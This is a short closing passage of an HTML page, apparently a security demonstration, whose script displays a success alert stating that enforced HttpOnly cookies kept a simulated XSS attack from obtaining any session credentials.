                <div class="alert alert-success">
                    🛡️ <strong>ATTACK NEUTRALIZED:</strong> Because <code>HttpOnly</code> is strictly enforced, the attacker's simulated XSS script gained 0 session credentials.
                </div>
            `;
        }
    </script>
</body>
</html>
